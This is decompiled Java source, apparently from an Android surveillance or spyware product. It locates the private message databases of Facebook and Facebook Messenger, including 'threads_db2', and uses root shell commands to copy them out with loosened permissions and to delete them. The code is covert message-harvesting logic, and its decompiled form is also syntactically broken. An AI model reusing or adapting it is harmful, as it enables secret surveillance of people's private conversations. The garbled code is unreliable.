package com.vvt.capture.b.b;

import com.vvt.ag.b;
import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.KMShell.ShellException;
import com.vvt.shell.ShellUtil;
import java.io.File;
import java.util.ArrayList;
import java.util.Iterator;

public class e
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.d;
  private static final boolean c = com.vvt.ak.a.e;
  
  public static final String a(String paramString)
  {
    int i = 2;
    int j = 1;
    Object localObject1 = new java/util/ArrayList;
    ((ArrayList)localObject1).<init>();
    Object localObject2 = new Object[i];
    localObject2[0] = "/data/data";
    localObject2[j] = paramString;
    String str1 = String.format("%s/%s/databases", (Object[])localObject2);
    ((ArrayList)localObject1).add(str1);
    localObject2 = new Object[i];
    String str2 = "/dbdata/databases";
    localObject2[0] = str2;
    localObject2[j] = paramString;
    str1 = String.format("%s/%s", (Object[])localObject2);
    ((ArrayList)localObject1).add(str1);
    str1 = null;
    localObject2 = ((ArrayList)localObject1).iterator();
    boolean bool1;
    boolean bool2;
    do
    {
      bool1 = ((Iterator)localObject2).hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (String)((Iterator)localObject2).next();
      bool2 = ShellUtil.b((String)localObject1);
    } while (!bool2);
    for (;;)
    {
      return (String)localObject1;
      bool1 = false;
      localObject1 = null;
    }
  }
  
  public static String a(String paramString1, String paramString2)
  {
    return p.a(paramString1, paramString2);
  }
  
  public static String a(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    String str = null;
    bool = ShellUtil.b(paramString1);
    if (bool) {}
    for (;;)
    {
      try
      {
        Object localObject = new java/io/File;
        ((File)localObject).<init>(paramString2);
        bool = ((File)localObject).exists();
        if (!bool)
        {
          localObject = "mkdir %s; chmod 777 %s; chown %s.%s %s";
          i = 5;
          arrayOfObject = new Object[i];
          j = 0;
          arrayOfObject[0] = paramString2;
          j = 1;
          arrayOfObject[j] = paramString2;
          j = 2;
          arrayOfObject[j] = paramString4;
          j = 3;
          arrayOfObject[j] = paramString4;
          j = 4;
          arrayOfObject[j] = paramString2;
          localObject = String.format((String)localObject, arrayOfObject);
          KMShell.a((String)localObject);
          bool = com.vvt.aa.a.c();
          if (bool) {
            ShellUtil.k(paramString2);
          }
        }
        localObject = new java/io/File;
        ((File)localObject).<init>(paramString1);
        localObject = ((File)localObject).getName();
        str = p.a(paramString2, (String)localObject);
        localObject = "%s cp %s %s; chmod 755 %s; chown %s.%s %s";
        int i = 7;
        Object[] arrayOfObject = new Object[i];
        int j = 0;
        arrayOfObject[0] = paramString3;
        j = 1;
        arrayOfObject[j] = paramString1;
        j = 2;
        arrayOfObject[j] = str;
        j = 3;
        arrayOfObject[j] = str;
        j = 4;
        arrayOfObject[j] = paramString4;
        j = 5;
        arrayOfObject[j] = paramString4;
        j = 6;
        arrayOfObject[j] = str;
        localObject = String.format((String)localObject, arrayOfObject);
        KMShell.a((String)localObject);
        bool = com.vvt.aa.a.c();
        if (bool) {
          ShellUtil.k(str);
        }
        bool = a;
        if (!bool) {}
      }
      catch (Exception localException)
      {
        bool = c;
        if (!bool) {
          continue;
        }
        continue;
      }
      return str;
      bool = b;
      if (!bool) {}
    }
  }
  
  public static boolean a()
  {
    boolean bool1 = true;
    String str1 = f("com.facebook.katana");
    String str2 = f("com.facebook.orca");
    boolean bool2 = b.a(str1);
    if (bool2)
    {
      bool2 = b.a(str2);
      if (bool2) {
        bool1 = false;
      }
    }
    return bool1;
  }
  
  public static void b(String paramString)
  {
    boolean bool;
    synchronized (e.class)
    {
      bool = a;
      if (bool) {}
      String str1 = c(paramString);
      String str2 = d(paramString);
      Object localObject2 = "rm -r %s";
      int i = 1;
      try
      {
        Object[] arrayOfObject = new Object[i];
        arrayOfObject[0] = str1;
        str1 = String.format((String)localObject2, arrayOfObject);
        KMShell.a(str1);
        str1 = "rm -r %s";
        int j = 1;
        localObject2 = new Object[j];
        i = 0;
        arrayOfObject = null;
        localObject2[0] = str2;
        str1 = String.format(str1, (Object[])localObject2);
        KMShell.a(str1);
      }
      catch (KMShell.ShellException localShellException)
      {
        for (;;)
        {
          bool = c;
          if (!bool) {}
        }
      }
      bool = a;
      if (bool) {}
      return;
    }
  }
  
  public static String c(String paramString)
  {
    return p.a(paramString, "com.facebook.katana");
  }
  
  public static String d(String paramString)
  {
    return p.a(paramString, "com.facebook.orca");
  }
  
  public static String e(String paramString)
  {
    return p.a(paramString, "busybox");
  }
  
  private static String f(String paramString)
  {
    int i = 3;
    int j = 2;
    int k = 1;
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = new java/util/ArrayList;
    ((ArrayList)localObject1).<init>();
    Object localObject2 = new Object[i];
    localObject2[0] = "/data/data";
    localObject2[k] = paramString;
    localObject2[j] = "threads_db2";
    String str1 = String.format("%s/%s/databases/%s", (Object[])localObject2);
    ((ArrayList)localObject1).add(str1);
    localObject2 = new Object[i];
    localObject2[0] = "/dbdata/databases";
    localObject2[k] = paramString;
    String str2 = "threads_db2";
    localObject2[j] = str2;
    str1 = String.format("%s/%s/%s", (Object[])localObject2);
    ((ArrayList)localObject1).add(str1);
    boolean bool2 = false;
    str1 = null;
    localObject2 = ((ArrayList)localObject1).iterator();
    boolean bool3;
    do
    {
      bool1 = ((Iterator)localObject2).hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (String)((Iterator)localObject2).next();
      bool3 = ShellUtil.b((String)localObject1);
    } while (!bool3);
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      return (String)localObject1;
      bool1 = false;
      localObject1 = null;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/removeFromPath/removeFromPath/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */